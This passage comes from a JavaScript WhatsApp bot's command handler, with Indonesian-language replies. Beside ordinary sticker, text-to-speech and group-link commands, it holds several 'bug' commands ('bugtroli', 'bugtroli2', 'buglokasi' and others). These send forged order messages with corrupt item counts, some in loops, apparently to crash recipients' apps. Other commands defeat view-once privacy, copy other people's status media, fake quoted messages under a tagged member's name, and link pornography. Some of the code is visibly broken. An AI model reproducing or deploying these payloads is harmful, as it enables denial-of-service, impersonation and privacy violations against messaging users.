				teks += `\n*Total : ${audionye.length}*\nGunakan perintah\n*${prefix}getvn (nama pack)*\nuntuk mengambil vn`
				hexa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": audionye } })
				break
			  case 'getstik':
				var itsme = `0@s.whatsapp.net`
				var split = `${cr}`
				var selepbot = {
					contextInfo: {
						participant: itsme,
						quotedMessage: {
							extendedTextMessage: {
								text: split,
							}
						}
					}
				}
				namastc = body.slice(9)
				try {
				result = fs.readFileSync(`./lib/sticker/${namastc}.webp`)
				hexa.sendMessage(from, result, sticker, selepbot)
				} catch {
				  reply('Pack tidak terdaftar')
				}
				break
			
			
			
			case 'liststik':
				teks = '*Sticker list :*\n\n'
				for (let awokwkwk of setiker) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${setiker.length}*\nGunakan perintah\n*${prefix}getstik (nama pack)*\nuntuk mengambil stiker`
				hexa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setiker } })
				break
			case 'addstik':
				if (!isQuotedSticker) return reply('Reply stiker nya')
				
				svst = body.slice(9)
				if (!svst) return reply('Nama sticker nya apa?')
				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await hexa.downloadMediaMessage(boij)
				setiker.push(`${svst}`)
				fs.writeFileSync(`./lib/sticker/${svst}.webp`, delb)
				fs.writeFileSync('./lib/stik.json', JSON.stringify(setiker))
				hexa.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`, MessageType.text, { quoted: mek })
				break
case 'addimg':
				if (!isQuotedImage) return reply('Reply imagenya')
				
				svst = body.slice(8)
				if (!svst) return reply('Nama imagenya apa')
				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await hexa.downloadMediaMessage(boij)
				imagenye.push(`${svst}`)
				fs.writeFileSync(`./lib/image/${svst}.jpeg`, delb)
				fs.writeFileSync('./lib/img.json', JSON.stringify(imagenye))
				hexa.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listimage`, MessageType.text, { quoted: mek })
				break

			case 'getimg':
				namastc = body.slice(8)
				try {
				buffer = fs.readFileSync(`./lib/image/${namastc}.jpeg`)
				hexa.sendMessage(from, buffer, image, { quoted: mek, caption: `Result From lib : ${namastc}.jpeg` })
				} catch {
				  reply('Pack tidak terdaftar')
				}
				break
				
			case 'listimg':
				teks = '*List Image :*\n\n'
				for (let awokwkwk of imagenye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${imagenye.length}*\nGunakan perintah\n*${prefix}getimg (nama pack)*\nuntuk mengambil gambar`
				hexa.sendMessage(from, teks.trim(), extendedText, { quoted:ftroli, contextInfo: { "mentionedJid": imagenye } })
				break
case 'hehe':
			sendMessageFromContent(from, {
			"stickerMessage": {
			"url": "https://mmg.whatsapp.net/d/f/At57IFU4Afr0T7XC3vfpAyA2NltBMtQ7XJnn2VStMyJb.enc",
			"fileSha256": "9K8mbAOeuRKjHuWGsuP3kPN7Gx9qQwperPw65UXZK5A=",
			"fileEncSha256": "QKauUcHFrE+gwYaQJM2+8Ln2gZqZDkfTeDELzNKkTJc=",
			"mediaKey": "RnVLCUH+HVXSOMEb3pUkG8/tnAOrSDISqx7pb0428b0=",
			"mimetype": "image/webp",
			"height": 64,
			"width": 64,
			"directPath": "/v/t62.15575-24/31334621_284653730103320_3590805588541236326_n.enc?ccb=11-4&oh=b00d9aab957eb0cc6e9e8fcc7e107a15&oe=61225E26",
			"fileLength": "9999999999",
			"mediaKeyTimestamp": "1627040636",
			"isAnimated": false }
			})
			break
    case 'linkgc':
        
        
        linkgc = await hexa.groupInviteCode(from)
        reply('https://chat.whatsapp.com/'+linkgc)
                    break
case "revoke":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        hexa.revokeInvite(from);
        reply("```Succes revoke link group```");
        break;
     case 'linkgrup':
      case 'linkgroup':
              hexa.sendMessage(from, 'Sibukk!!')
               await sleep(1000)
               txtt =`Hai Kak ${pushname}\nPilih mode di bawah ini`
               buttonsMessage = [{buttonId: `${prefix}linkgc_`,buttonText:{displayText: '📌 Link group'},type:1},{buttonId:`${prefix}revoke`,buttonText:{displayText: '🔓 Reset link'},type:1}]
               buttonsMessage = { contentText: `${txtt}`, footerText: 'choose one', buttons: buttonsMessage, headerType: 1 }
               prep = await hexa.prepareMessageFromContent(from,{buttonsMessage},{})
               hexa.relayWAMessage(prep)
               break
case 'kodenegara':
hexa.sendMessage(from, negara(prefix, sender), text, {
  quoted: fvideo
})
break
//Case game
     case 'slot': 
			slot = `╔════════════════════\n`
		    slot += `║╭───────────[ *SLOT* ]───\n`
			slot += `║│➻ ${slot11} ║ ${slot22} ║ ${slot33}\n`
			slot += `║│➻ ${slot44} ║ ${slot55} ║ ${slot66} <====\n`
		    slot += `║│➻ ${slot77} ║ ${slot88} ║ ${slot99}	\n`			  				    
		    slot += `║│➻ GAME : SLOT [ *NEW* ]\n`
			slot += `║╰───────────────────\n`
			slot += `╚════════════════════\n`
			hexa.sendMessage(from, slot, text, {quoted:ftroli})
		    break
case 'xox':     
 case 'tictactoe':
                    oxz1 = `[ ${oxo11} ]\n`
                    oxz1 += `[ ${oxo22} ]\n`
                    oxz1 += `[ ${oxo33} ]\n`
                    reply(oxz1)
					break
		case 'pesan':
					if (!isGroup) return reply('GRUB ONLY')
				    if (args.length < 1) return reply(`[❗] CONTOHH??\n${prefix}${command}pesan @tagmember|halo kak`)
					var FG = body.slice(8)
					var F1 = FG.split("|")[0];
					var F2 = FG.split("|")[1];
					hexa.sendMessage(`${F1}@s.whatsapp.net`, `DARI ${pushname}\nPESAN : ${F2}`, text, {quoted:mek})
					reply('PESAN SUDAH TERKIRIM')
					break
//--google voice
				case 'tts':
					if (args.length < 1) return hexa.sendMessage(from, 'Kode bahasanya mana om?', text, {quoted: mek})
					const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return hexa.sendMessage(from, 'Textnya mana om', text, {quoted: mek})
					dtt = body.slice(8)
					ranm = getRandom('.mp3')
					dtt.length > 600
					? reply('Textnya kebanyakan om')
					: gtts.save(ranm, dtt, function() {
						hexa.sendMessage(from, fs.readFileSync(ranm), audio, {quoted: fvideo, mimetype: 'audio/mp4', ptt:true})
						fs.unlinkSync(ranm)
					})
					break
case 'tts2':
				   hexa.updatePresence(from, Presence.recording) 
				   if (args.length < 1) return hexa.sendMessage(from, 'Kode bahasanya mana om?', text, {quoted: mek})
					const tts = require('./lib/gtts')(args[0])
					if (args.length < 2) return hexa.sendMessage(from, 'Textnya mana om', text, {quoted: mek})
					dtt = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					dtt.length > 600
					? reply('Textnya kebanyakan om')
					: gtts.save(ranm, dtt, function() {
						exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
							fs.unlinkSync(ranm)
							buff = fs.readFileSync(rano)
							if (err) return reply('Gagal om:(')
							hexa.sendMessage(from, buff, audio, {quoted: mek, ptt:true})
							fs.unlinkSync(rano)
						})
					})
					break
					          case 'ghsearch': 
          case 'githubsearch': 
          case 'searchgithub':
              if (!q) return reply('Cari apa?')
              res = await fetch('https://api.github.com/search/repositories?q='+q)
              json = await res.json()
              if (res.status !== 200) throw json
              str = json.items.map((repo, index) => {
              return `
${1 + index}. *${repo.full_name}*${repo.fork ? ' (fork)' : ''}
_${repo.html_url}_
_Dibuat pada *${formatDate(repo.created_at)}*_
_Terakhir update pada *${formatDate(repo.updated_at)}*_
👁  ${repo.watchers}   🍴  ${repo.forks}   ⭐  ${repo.stargazers_count}
${repo.open_issues} Issue${repo.description ? `
*Deskripsi:*\n${repo.description}` : ''}
*Clone:* \`\`\`$ git clone ${repo.clone_url}\`\`\`
`.trim()
}).join('\n\n')
              reply(str)
              break
case 'bug':
        
              try {
              quotedText = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
              Buggc(from, `${quotedText}`)
              } catch {
              Buggc(from, `${q}`)
}
              break
          case 'wangy':
              if (!q) return
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              reply(awikwok)
              break
//--------------< Sticker Cmd >-------------------
      //------------------< Sticker Cmd >-------------------
      case "addcmd":
      case "setcmd":
        if (isQuotedSticker) {
          if (!q)
            return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`);
          var kodenya =
            mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString(
              "base64"
            );
          addCmd(kodenya, q);
          fakestatus("Done!");
        } else {
          reply("tag stickenya");
        }
        break;
      case "delcmd":
        if (!isQuotedSticker)
          return reply(`Penggunaan : ${command} tagsticker`);
        var kodenya =
          mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString(
            "base64"
          );
        _scommand.splice(getCommandPosition(kodenya), 1);
        fs.writeFileSync("./lib/scommand.json", JSON.stringify(_scommand));
        fakestatus("Done!");
        break;
      case "listcmd":
        teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``;
        cemde = [];
        for (let i of _scommand) {
          cemde.push(i.id);
          teksnyee += `\n\n➸ *ID :* ${i.id}\n➸ *Cmd* : ${i.chats}`;
        }
        mentions(teksnyee, cemde, true);
        break;
case 'bugtroli':
              
     function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
hexa.sendMessage(nomor, `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`, MessageType.extendedText,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
    orderMessage: {
    thumbnail: fs.readFileSync('./lib/image/fino.jpeg'),
    itemCount: -969769349, // Bug
    status: 1,
    surface: 1,
    message: '☠️Asylum☠️',
    orderTitle: 'AsylumVirus', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
hexa.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}	
async function attack(targett){
bug(targett)
await sleep(100)
troli(targett)
await sleep(100)
bug(targett)
}

attack(mek.key.remoteJid)
break
case 'bugtroli2':

if (args.length < 1) return reply('Jumlahnya?')
		        try {
		        var hets = `${namabot}`
		        var grousp = await hexa.groupMetadata(from)
                var membere = grousp['participants']
                var mems = []
                membere.map(async adm => {
                    mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                var options = {
                    text: hets,
                    contextInfo: { mentionedJid: mem },
                    quoted: mek
                }
		        for (let i = 0; i < args[0]; i++) {
		        hexa.sendMessage(from, options, text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${namabot}`,
						"orderTitle": `${NamaOwner}`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        } catch {
		          for(let i=0;i<10;i++){
		        hexa.sendMessage(from, 'Berhasil Mengirim Bug Troli2', text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${namabot}`,
						"orderTitle": `${NamaOwner}`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        }
		       break
case 'bugcombine':

                 hexa.toggleDisappearingMessages(from, 'HACKED')
hexa.sendMessage(from, `${namabot}`, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `${namabot}`,
    orderTitle: `${NamaOwner}`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
setTimeout( () => {
	    hexa.updatePresence(from, Presence.recording)
	    sendMess(`dahlah`)
	    }, 2000)
	    reply(`dahlah`)
break
case 'buglokasi':

hexa.updatePresence(from, Presence.recording)
		       hexa.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: `${NamaOwner}`,
						address: `${namabot}`,
                        jpegThumbnail: fs.readFileSync('./lib/image/fino.jpeg') },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `${NamaOwner}`,
    orderTitle: `${namabot}`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
case 'bugpc':
					case 'bugpc':

hexa.updatePresence(from, Presence.recording)
hexa.sendMessage(from, 'yaudah oke',text, {
 quoted: {
  key: {
   participant: '1111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `${namabot}`,
    orderTitle: `${NamaOwner}`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
case 'bugmenu':
 var y = `${prefix}bughole\n${prefix}bugpc\n${prefix}buglokasi\n${prefix}bugtroli2\n${prefix}bugtroli`
hexa.sendMessage(from, y, text, {quoted:fvideo})
break

case 'viewto':
 case 'toview': 
 MessageType.text, {quoted: mek, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}}
      const viewary = []
      const untpar = JSON.stringify(mek.message[type].contextInfo.quotedMessage.viewOnceMessage.message)
      const popet = JSON.parse(untpar)
      console.log(JSON.parse(JSON.stringify(mek.message[type].contextInfo.quotedMessage.viewOnceMessage.message)))
      if (!mek.message[type].contextInfo.quotedMessage.viewOnceMessage) return reply("No es nesesario convertir.")
      const viewtype = Object.keys(popet)[0]
      viewary.push(JSON.parse(untpar))
      delete popet[viewtype].viewOnce
      const viewom = hexa.prepareMessageFromContent(from, popet,{quoted: mek})
      await hexa.relayWAMessage(viewom)
      break

     
case 'once':
if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
			boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			owgi = await hexa.downloadMediaMessage(boij)
hexa.sendMessage(from, owgi, "imageMessage", { viewOnce: true }) }
break
            case 'group':
              hexa.sendMessage(from, 'Sibukk!!')
               await sleep(1000)
               txtt =`Hai Kak ${pushname}\nPilih mode di bawah ini`
               buttonsMessage = [{buttonId: `${prefix}closegc`,buttonText:{displayText: 'Tutup grup'},type:1},{buttonId:`${prefix}opengc`,buttonText:{displayText: 'Open group'},type:1}]
               buttonsMessage = { contentText: `${txtt}`, footerText: 'choose one', buttons: buttonsMessage, headerType: 1 }
               prep = await hexa.prepareMessageFromContent(from,{buttonsMessage},{})
               hexa.relayWAMessage(prep)
               break
            
               
      case 'antibule':
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isKickarea) return reply("Sudah aktif!!");
          kickarea.push(from);
          fs.writeFileSync(
            "./lib/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mengaktifkan kickarea!");
        } else if (args[0] == "off") {
          kickarea.splice(from, 1);
          fs.writeFileSync(
            "./lib/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mematikan kickarea!");
        } else if (!q) {
          sendButMessage(from, `MODE KICKAREA`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}kickarea on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}kickarea off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
case "antihidetag":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntihidetag) return reply("Sudah aktif!!");
          antihidetg.push(from);
          fs.writeFileSync(
            "./lib/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mengaktifkan antihidetag!");
        } else if (args[0] == "off") {
          antihidetg.splice(from, 1);
          fs.writeFileSync(
            "./lib/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mematikan antihidetag!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTI HIDETAG`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antihidetag on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antihidetag off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
      case "antiviewonce":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntiviewonce) return reply("Sudah aktif!!");
          antivo.push(from);
          fs.writeFileSync("./lib/antivo.json", JSON.stringify(antivo));
          reply("Sukses mengaktifkan antiviewonce!");
        } else if (args[0] == "off") {
          antivo.splice(from, 1);
          fs.writeFileSync("./lib/antivo.json", JSON.stringify(antivo));
          reply("Sukses mematikan antiviewonce!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTI VIEWONCE`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antiviewonce on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antiviewonce off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
case "colongsw": //arif
 case "colong":
  case 'curi':
        if (!mek.key.fromMe) return;
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          ger = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await hexa.downloadAndSaveMediaMessage(ger);
          hexa.sendMessage(sender, fs.readFileSync(owgi), "imageMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else if ((isMedia && !mek.message.videoMessage) || isQuotedVideo) {
          ger = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await hexa.downloadAndSaveMediaMessage(ger);
          hexa.sendMessage(sender, fs.readFileSync(owgi), "videoMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else {
          reply("Reply sw foto / video yg mau dicolong");
        }
        break;
      case "caripesan":
        if (!q) return reply("pesannya apa bang?");
        let maruf = await hexa.searchMessages(q, from, 10, 1);
        let ss = v.messages;
        let ell = ss.filter((maruf) => v.message);
        el.shift();
        try {
          if (ell[0].message.conversation == undefined) return;
          reply(`Ditemukan ${el.length} pesan`);
          await sleep(3000);
          for (let i = 0; i < el.length; i++) {
            await hexa.sendMessage(from, "Nih pesannya", text, {
              quoted: el[i],
            });
          }
        } catch (e) {
          reply("Pesan tidak ditemukan!");
        }
        break;
      case "githubstalk2":
        if (!q) return reply("Usernamenya?");
        const oi = await fetchJson(
          `https://api.dhnjing.xyz/stalk/github?user=dehan-j1ng`
        );
        const mm = `*GITHUB STALK*
    Username: ${oi.result.username}
    Fullname: ${oi.result.name}
    Bio: ${oi.result.user_bio}

    Jumlah repo: ${oi.result.user_repo}
    Following: ${oi.result.user_following}
    Follower: ${oi.result.user_followers}`;
        reply(mm);
        break;
      case "tiktokstalk2":
        if (!q) return reply("Usernamenya? ");
        var i = await fetchJson(
          `https://api.dhnjing.xyz/stalk/tiktok?user=@${q}`
        );
        buff = await getBuffer(i.result.user.avatarLarger);
        var ii = `*TIKTOK STALK*
    Username: ${q}
    Nickname: ${i.result.user.nickname}
    Bio: ${i.result.user.signature}

    Jumlah postingan: ${i.result.stats.videoCount}
    Following: ${i.result.stats.followingCount}
    Follower: ${i.result.stats.followerCount}`;
        hexa.sendMessage(from, buff, image, { quoted: mek, caption: ii });
        break;
case 'fyoutube':
 var menu = `tes`
hexa.sendMessage(from, menu, text, { quoted:ftroli, contextInfo: { externalAdReply : { title: 'ìąʍ ƒìղօ 菲诺', body : '𝑥  999  𝑥', mediaType: 2, thumbnail: fs.readFileSync('./lib/image/fino.jpeg'), mediaUrl: 'https://youtu.be/33C7D7sBmCQ'}}})
	break
case 'fig':
var pler = `tes`
hexa.sendMessage(from, pler, text, { quoted:ftroli, contextInfo: { externalAdReply : { title: 'ìąʍ ƒìղօ 菲诺', body : '𝑥  999  𝑥', mediaType: 2, thumbnail: fs.readFileSync('./lib/image/fino.jpeg'), mediaUrl: 'https://instagram.com/finoooooo_'}}})
	break
case 'fxnxx':
var plerr = `tes`
hexa.sendMessage(from, plerr, text, { quoted:ftroli, contextInfo: { externalAdReply : { title: 'ìąʍ ƒìղօ 菲诺', body : '𝑥  999  𝑥', mediaType: 2, thumbnail: fs.readFileSync('./lib/image/fino.jpeg'), mediaUrl: 'https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn'}}})
	break
case 'fwa':
var plerrr = `tes`
hexa.sendMessage(from, plerrr, text, { quoted:ftroli, contextInfo: { externalAdReply : { title: 'ìąʍ ƒìղօ 菲诺', body : '𝑥  999  𝑥', mediaType: 2, thumbnail: fs.readFileSync('./lib/image/cecan.jpeg'), sourceUrl: 'https://youtu.be/taYxyE34jjY'}}})
	break
          case 'fb':
            case 'fbdl':
            case 'facebook':{
      
                if (args.length < 2) return reply(`Kirim perintah *${prefix}fb* url`)
                if (!isUrl(args[1]) && !args[1].includes('facebook.com')) return reply(mess.error.Iv)
                reply(mess.wait)
                fbdl(args[1])
                .then((res) => {
                    hexa.sendFileFromUrl(from, res.result.links[0].url)
                    limitAdd(sender, limit)
                })
                .catch((err) => {
                    hexa.sendMess(ownerNumber[0], 'FB Error : ' + err)
                    console.log(color('[FB]', 'red'), err)
                    reply(mess.error.api)
                })
            }
                break
               case 'instagram':
                peler = `https://instagram.com/finoooooo_\nFollow kak,nanti di flbck`
                hexa.sendMessage(from, peler, text, {quoted:fvideo})
                break
                case 'web':
                 peler2 = `${github}\nFollow kak nanti aku flbck`
                 hexa.sendMessage(from, peler2, text, {quoted:fvideo})
                 break
                 
case 'owner2':
 nomor = `50587753432@s.whatsapp.net`
var thumbnail = fs.readFileSync('./lib/image/xx.jpeg')
		var media = await hexa.prepareMessage(from, thumbnail, MessageType.image)
media.message = (Object.keys(media.message)[0] === 'ephemeralMessage') ? media.message.ephemeralMessage.message : media.message
	var iniBUtonsss = [
		{buttonId: `${prefix}owner`, buttonText: {displayText: 'OWNER NUMBER'}, type: 1},
		{buttonId: `${prefix}instagram`, buttonText: {displayText: 'INSTAGRAM'}, type: 1},
  {buttonId: `${prefix}web`, buttonText: {displayText: 'GITHUB'}, type: 1}

		]
		var buttonMessageee = {
		contentText: `Hai kak ${pushname}\nMau kenalan dengan owner ku?\nOwner Number: @${nomor.split("@")[0]}, Mau chat? silahkan, tapi jangan minta bokep ajg`,
		footerText: 'Pilih aja ya kak mau yg mana',
		buttons: iniBUtonsss,
		headerType: 4,
		imageMessage: media.message.imageMessage
		}
		await hexa.sendMessage(from, buttonMessageee, MessageType.buttonsMessage, {quoted: fvideo, contextInfo: { mentionedJid: [nomor], externalAdReply:{ title: 'ìąʍ ƒìղօ 菲诺', body : '𝑥  999  𝑥', mediaType: 2, thumbnail: fs.readFileSync('./lib/image/cecan.jpeg'), mediaUrl: 'instagram.com/finoooooo_'}}})
  break
      
case 'peler':
 menu = `tes`
sendButLok(from, menu, [
          {
            buttonId: `${prefix}menu`,
            buttonText: {
              displayText: `Info`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}owner`,
            buttonText: {
              displayText: `Owner`,
            },
            type: 1,
          },
        ], {quoted: mek});
        break
case 'speedtest':
 reply(mess.wait)
			exec('speed-test --json', (err, stdout) => {
			if(err) return reply(`${err}`)
			if (stdout) {
			hexa.sendMessage(from, stdout, text, {quoted:ftroli, contextInfo: { externalAdReply: { title: 'ìąʍ ƒìղօ 菲诺', body : '🧿Follow my instagram🧿', mediaType: 2, thumbnail: fs.readFileSync('./lib/image/cecan.jpeg'), sourceUrl: 'instagram.com/finoooooo_'}}})
			}})
break
case 'nhentai2':
        anu = await fetchJson(`https://myhuman.herokuapp.com/api/animanga/nhentai?query=${q}`)
        teks = `\n \n`
        for(let f of anu.result)
     teks+= `Nhentai Search\nTitle: ${f.title}\nLink: ${f.link}\nLink Image: ${f.image} \n \n`
      reply(teks.trim())
       break
        case 'testapi':
         case 'tesapi':
       q = args.join(" ")
     anu = await fetchJson(`https://rest-api-agung-testing.herokuapp.com/api/news/tempo?type=${q}&apikey=agungnoltes01`)
     teks = `\n \n`
   teks+= `Nama Berita: ${anu.result.data.title}\nLink Berita: ${anu.result.da.title.link}\nKonten Berita: ${anu.result.data.content} \n \n`
  reply(teks.trim())
  break
  case 'carifilm':
   q = args.join(" ")
   p = await fetchJson(`https://agung-rest-api26.herokuapp.com/api/lk21/search?film=${q}&apikey=agungnoltes01` , {method:'get'})
   buffer = await getBuffer(p.result.thumbnail)
   teks = `\n \n`
   ini_teks += `Nama Film: ${p.result.title}\nGenre: ${p.result.genre}\nRating: ${p.result.rating}\nDuration: ${p.result.duration}\nQuality: ${p.result.quality}\nTrailer: ${p.result.trailer}\nTonton di: ${p.result.watch}\n \n`
   hexa.sendMessage(from, buffer, image, {quoted:mek,caption:ini_teks})
   break
   case 'carifilm2':
    ler = await fetchJson(`https://api.dhnjing.xyz/search/layarkaca/film?query=${q}`, {method:'get'})
  get_result = ler.result[0]
    buffer = await getBuffer(ler.result.link_thumb)
 teks = `\n \n`
  teks += `*[ SEARCH FILM ]*\nJudul Film: ${get_result.result.film}\nTonton Di: ${get_result.result.film_url}`
hexa.sendMessage(from, buffer, image, {quoted:mek,caption:teks})
  break
//--fake reply
case 'fitnah':
if (args.length < 1) return reply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
var gh = body.slice(7)
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
var replace = gh.split("|")[0];
var target = gh.split("|")[1];
var bot = gh.split("|")[2];
hexa.sendMessage(from, `${bot}`, text, {
  quoted: {
key: {
  fromMe: false, participant: `${mentioned}`, ...(from ? {
remoteJid: from
  }: {})
}, message: {
  conversation: `${target}`
}}})
break
case 'tes5':
 run = process.uptime()
 nomor = `50587753432@s.whatsapp.net`
const fkontak ={
